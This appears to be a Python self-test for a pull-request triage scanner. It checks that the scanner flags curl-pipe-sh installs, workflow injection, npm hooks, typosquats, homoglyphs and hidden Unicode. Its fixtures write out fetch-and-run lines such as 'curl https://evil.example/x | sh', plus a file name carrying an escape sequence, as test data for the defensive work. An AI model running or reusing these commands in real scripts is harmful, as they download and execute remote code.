#!/usr/bin/env python3
"""End-to-end self-test for the pr-triage collector.

Runs the collector against a fake `gh` and a throwaway git repository and
asserts on the manifest. No network, no real GitHub, no changes outside its
own temp directory.

    python3 selftest.py

On Windows, run it from Git Bash or WSL: the stand-in for the GitHub CLI is a
#!/bin/sh-free Python script, but PATH handling and chmod are still POSIX.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
COLLECT = HERE.parent / "scripts" / "collect.py"
FAKEGH = HERE / "bin"

failures = []
checks = 0


def check(name, condition, detail=""):
    global checks
    checks += 1
    if not condition:
        failures.append("%s%s" % (name, (": " + detail) if detail else ""))
        print("  FAIL  %s %s" % (name, detail))
    else:
        print("  ok    %s" % name)


def run_collect(args, cwd, with_gh=True, fixtures=None):
    env = dict(os.environ)
    base = env.get("PATH", "")
    env["PATH"] = (str(FAKEGH) + os.pathsep + base) if with_gh else base
    if fixtures:
        env["PR_TRIAGE_FIXTURES"] = str(fixtures)
    p = subprocess.run([sys.executable, str(COLLECT)] + args, cwd=cwd, env=env,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       encoding="utf-8", errors="replace")
    return p


def load(tmp, name="manifest.json"):
    return json.loads((Path(tmp) / name).read_text(encoding="utf-8"))


print("\n== 1. hostile PR through the fake gh ==")
with tempfile.TemporaryDirectory() as td:
    out = Path(td) / "r"
    p = run_collect(["https://github.com/acme/widgets/pull/42", "--out", str(out)], td)
    check("exit 0", p.returncode == 0, p.stderr[-300:])
    m = load(out)
    rules = {(h["rule"], h["path"]) for h in m["scan"]["hits"]}
    for rule, path in [
        ("curl-pipe-sh", "install.sh"),
        ("pr-target", ".github/workflows/deploy.yml"),
        ("wf-injection", ".github/workflows/deploy.yml"),
        ("npm-lifecycle", "package.json"),
        ("typosquat-candidate", "package.json"),
        ("eval", "src/telemetry.ts"),
        ("inject-ignore", "src/telemetry.ts"),
        ("drop-host", "src/telemetry.ts"),
        ("atob", "src/telemetry.ts"),
    ]:
        check("scan finds %s in %s" % (rule, path), (rule, path) in rules)
    check("three typosquat candidates", sum(1 for h in m["scan"]["hits"]
                                            if h["rule"] == "typosquat-candidate") == 3)
    check("PR body bidi/ansi neutralised", "bidi" in m["pr"]["body_notes"]
          and "ansi" in m["pr"]["body_notes"], str(m["pr"]["body_notes"]))
    check("injection warning raised", any("automated reviewer" in w for w in m["warnings"]))
    check("fork warning raised", any("fork" in w for w in m["warnings"]))
    check("binary file marked no-patch",
          any(f["path"] == "assets/logo.tar.gz" and f["no_patch_reason"] for f in m["files"]))
    check("CI checks captured", m["checks"]["state"] == "failing"
          and len(m["checks"]["items"]) == 3, str(m["checks"])[:120])
    check("failing CI raises a warning", any("CI is failing" in w for w in m["warnings"]))
    check("commits captured", len(m["commits"]) == 2)
    # every window must be inside the file and start with its header
    dl = (out / "diff.patch").read_text(encoding="utf-8").split("\n")
    ok_windows = True
    for f in m["files"]:
        w = dl[f["start_line"] - 1:f["end_line"]]
        if not w or not w[0].startswith("### FILE %d/" % f["index"]):
            ok_windows = False
            print("      bad window for", f["path"], w[:1])
        if "### PATCH-START" not in w or "### PATCH-END" not in w:
            ok_windows = False
            print("      missing markers for", f["path"])
    check("all file windows valid and fenced", ok_windows)
    body = (out / "body.md").read_text(encoding="utf-8")
    check("no ANSI left in body.md", "\x1b" not in body)
    check("bidi override made visible", "<U+202E>" in body, repr(body[-40:]))
    dp = (out / "diff.patch").read_text(encoding="utf-8")
    check("no ANSI left in diff.patch", "\x1b" not in dp)
    check("bidi/zero-width made visible in diff",
          "<U+202E>" in dp and "<U+200B>" in dp)

    check("a space in a filename survives",
          any(f["path"] == "docs/notes with space.md" for f in m["files"]),
          str([f["path"] for f in m["files"]]))
    check("a newline in a filename does not break the windows",
          any("weird\\nname.txt" in f["path"] for f in m["files"]),
          str([f["path"] for f in m["files"]]))
    check("a homoglyph identifier is caught",
          any(h["rule"] == "homoglyph-identifier" and h["path"] == "src/auth/session.ts"
              for h in m["scan"]["hits"]),
          str([(h["rule"], h["path"]) for h in m["scan"]["hits"] if "homoglyph" in h["rule"]]))
    check("ordinary accents and non-Latin strings are not flagged",
          sum(1 for h in m["scan"]["hits"] if h["rule"] == "homoglyph-identifier") == 1,
          str([h["snippet"] for h in m["scan"]["hits"] if h["rule"] == "homoglyph-identifier"]))
    hh = [h for h in m["scan"]["hits"] if h["rule"] == "homoglyph-identifier"]
    check("hidden characters are shown, not silently dropped",
          bool(hh) and "U+0430" in hh[0]["snippet"], str(hh[:1]))

print("\n== 2. truncation of an oversized patch ==")
with tempfile.TemporaryDirectory() as td:
    # build a fake gh whose single file has a 4000-line patch
    fx = Path(td) / "fx"
    fx.mkdir()
    big = ["@@ -1,1 +1,4000 @@"]
    for i in range(4000):
        big.append("+const line_%d = %d;" % (i, i))
    files = [{"sha": "x", "filename": "big.js", "status": "modified",
              "additions": 4000, "deletions": 0, "changes": 4000,
              "patch": "\n".join(big)}]
    (fx / "files.json").write_text(json.dumps(files), encoding="utf-8")
    (fx / "commits.json").write_text("[]", encoding="utf-8")
    (fx / "pr.json").write_text(json.dumps({
        "number": 7, "title": "big", "state": "open", "draft": False,
        "user": {"login": "x"}, "head": {"ref": "b", "sha": "s", "repo": {"full_name": "acme/widgets"}},
        "base": {"ref": "main"}, "additions": 4000, "deletions": 0, "changed_files": 1,
        "body": ""}), encoding="utf-8")
    out = Path(td) / "r"
    p = run_collect(["7", "--repo", "acme/widgets", "--out", str(out),
                     "--max-file-lines", "500"], td, fixtures=fx)
    check("truncation run exit 0", p.returncode == 0, p.stderr[-300:])
    m = load(out)
    f = m["files"][0]
    check("file flagged truncated", f["truncated"] is True)
    check("dropped-line count recorded", f.get("dropped_lines", 0) > 3000, str(f.get("dropped_lines")))
    dp = (out / "diff.patch").read_text(encoding="utf-8")
    check("marker explains the gap", "patch lines not shown" in dp)
    check("kept within the cap", f["patch_lines"] <= 500, str(f["patch_lines"]))

print("\n== 2b. hostile encodings and empty patches ==")
with tempfile.TemporaryDirectory() as td:
    fx = Path(td) / "fx"
    fx.mkdir()
    files = [
        # a lone surrogate reaches write_text() as a UnicodeEncodeError unless
        # sanitize() deals with it first
        {"sha": "s1", "filename": "surrogate.txt", "status": "added",
         "additions": 1, "deletions": 0, "changes": 1,
         "patch": "@@ -0,0 +1 @@\n+hello \ud800 world\n"},
        # an empty patch is not a binary file
        {"sha": "s2", "filename": "empty.txt", "status": "modified",
         "additions": 0, "deletions": 0, "changes": 0, "patch": ""},
        # a path carrying an escape sequence must not reach the terminal raw
        {"sha": "s3", "filename": "evil\x1b[2Jname.txt", "status": "added",
         "additions": 1, "deletions": 0, "changes": 1,
         "patch": "@@ -0,0 +1 @@\n+harmless\n"},
    ]
    (fx / "files.json").write_text(json.dumps(files), encoding="utf-8")
    (fx / "commits.json").write_text("[]", encoding="utf-8")
    (fx / "pr.json").write_text(json.dumps({
        "number": 9, "title": "t\u001b[2Jitle", "state": "open", "draft": False,
        "user": {"login": "x"}, "head": {"ref": "b", "sha": "s", "repo": {"full_name": "acme/widgets"}},
        "base": {"ref": "main"}, "additions": 3, "deletions": 0,
        "changed_files": 3, "body": None}), encoding="utf-8")
    out = Path(td) / "r"
    p = run_collect(["9", "--repo", "acme/widgets", "--out", str(out)], td, fixtures=fx)
    check("surrogate does not crash the run", p.returncode == 0, p.stderr[-300:])
    check("no traceback in stderr", "Traceback" not in p.stderr, p.stderr[-200:])
    m = json.loads((out / "manifest.json").read_text(encoding="utf-8"))
    check("surrogate reported as a note",
          any("surrogate" in w or "hidden characters" in w for w in m["warnings"]),
          str(m["warnings"]))
    empty = [f for f in m["files"] if f["path"] == "empty.txt"][0]
    check("empty patch explained", "empty diff" in (empty["no_patch_reason"] or ""),
          str(empty["no_patch_reason"]))
    dp = (out / "diff.patch").read_text(encoding="utf-8")
    sc = (out / "scan.txt").read_text(encoding="utf-8")
    check("no ESC anywhere in the outputs", "\x1b" not in dp and "\x1b" not in sc)
    check("null PR body handled", (out / "body.md").read_text(encoding="utf-8") == "")

print("\n== 3. local git fallback (no gh) ==")
with tempfile.TemporaryDirectory() as td:
    repo = Path(td) / "repo"
    repo.mkdir()
    git = ["git", "-C", str(repo)]
    subprocess.run(git + ["init", "-q", "-b", "main"], check=True)
    subprocess.run(git + ["config", "user.email", "t@example.com"], check=True)
    subprocess.run(git + ["config", "user.name", "T"], check=True)
    (repo / "app.py").write_text("print('one')\n", encoding="utf-8")
    (repo / ".gitignore").write_text(".local/\n", encoding="utf-8")
    subprocess.run(git + ["add", "."], check=True)
    subprocess.run(git + ["commit", "-qm", "base"], check=True)
    # the change must live on a branch, otherwise merge-base(main, HEAD) is HEAD
    subprocess.run(git + ["checkout", "-qb", "feature"], check=True)
    (repo / "app.py").write_text(
        "print('one')\nimport subprocess\nsubprocess.run('curl http://x.sh | sh', shell=True)\n",
        encoding="utf-8")
    (repo / "new.txt").write_text("hello\n", encoding="utf-8")
    subprocess.run(git + ["add", "."], check=True)
    subprocess.run(git + ["commit", "-qm", "add a fetch"], check=True)
    p = run_collect(["--from-git", "--base", "main"], str(repo), with_gh=False)
    check("git mode exit 0", p.returncode == 0, p.stderr[-400:])
    manifests = sorted(repo.rglob("manifest.json"))
    check("manifest written inside the repository", len(manifests) == 1,
          str([str(x.relative_to(repo)) for x in manifests]))
    m = json.loads(manifests[0].read_text(encoding="utf-8"))
    check("git mode sees both files", {f["path"] for f in m["files"]} == {"app.py", "new.txt"},
          str([f["path"] for f in m["files"]]))
    check("git mode scans the diff", any(h["rule"] == "curl-pipe-sh" for h in m["scan"]["hits"]))
    # the case the audit found broken: git C-quotes non-ASCII paths in the
    # patch header, so header-splitting silently lost the file
    subprocess.run(git + ["checkout", "-q", "main"], check=True)
    subprocess.run(git + ["checkout", "-qb", "unicode"], check=True)
    (repo / "na\u00efve.sh").write_text("curl https://evil.example/x | sh\n", encoding="utf-8")
    (repo / "dir with space").mkdir(exist_ok=True)
    (repo / "dir with space" / "a b.txt").write_text("hello\n", encoding="utf-8")
    subprocess.run(git + ["add", "."], check=True)
    subprocess.run(git + ["commit", "-qm", "add unicode and spaced paths"], check=True)
    p2 = run_collect(["--from-git", "--base", "main"], str(repo), with_gh=False)
    check("git mode handles unicode paths", p2.returncode == 0, p2.stderr[-300:])
    m2 = json.loads(sorted(repo.rglob("manifest.json"))[-1].read_text(encoding="utf-8"))
    names = {f["path"] for f in m2["files"]}
    check("non-ASCII filename is not dropped", "na\u00efve.sh" in names, str(names))
    check("spaced path is not dropped", "dir with space/a b.txt" in names, str(names))
    check("scan still runs on that file",
          any(h["rule"] == "curl-pipe-sh" for h in m2["scan"]["hits"]),
          str([(h["rule"], h["path"]) for h in m2["scan"]["hits"]]))

    check("output landed in a git-ignored directory",
          ".local" in str(manifests[0]) and "git-ignored" in m["output_dir_reason"],
          m["output_dir_reason"])
    st = subprocess.run(git + ["status", "--porcelain"], capture_output=True, text=True).stdout
    check("repository left clean", st.strip() == "", repr(st))

print("\n== 4. failure modes ==")
with tempfile.TemporaryDirectory() as td:
    p = run_collect(["42"], td, with_gh=False)
    check("missing gh exits 2", p.returncode == 2, "%s %s" % (p.returncode, p.stderr[:120]))
    check("missing gh message is actionable", "gh auth login" in p.stderr or "Install it" in p.stderr,
          p.stderr[:200])
with tempfile.TemporaryDirectory() as td:
    p = run_collect(["--from-git"], td, with_gh=False)
    check("git mode outside a repo fails cleanly", p.returncode in (3, 4)
          and "not a git repository" in (p.stderr or "").lower(),
          "%s %s" % (p.returncode, p.stderr[:150]))

print("\n== 5. no repository determinable ==")
with tempfile.TemporaryDirectory() as td:
    env_bin = Path(td) / "bin"
    env_bin.mkdir()
    (env_bin / "gh").write_text(
        "#!/bin/sh\ncase \"$*\" in\n *auth*) exit 0;;\n *) exit 1;;\nesac\n",
        encoding="utf-8")
    (env_bin / "gh").chmod(0o755)
    env = dict(os.environ)
    env["PATH"] = str(env_bin) + os.pathsep + env.get("PATH", "")
    p = subprocess.run([sys.executable, str(COLLECT), "42"], cwd=td, env=env,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       encoding="utf-8", errors="replace")
    check("unresolvable repo exits 4", p.returncode == 4, "%s %s" % (p.returncode, p.stderr[:160]))
    check("asks for --repo", "--repo" in p.stderr, p.stderr[:160])

print("\n%d checks, %d failure(s)" % (checks, len(failures)))
for f in failures:
    print("  -", f)
sys.exit(1 if failures else 0)
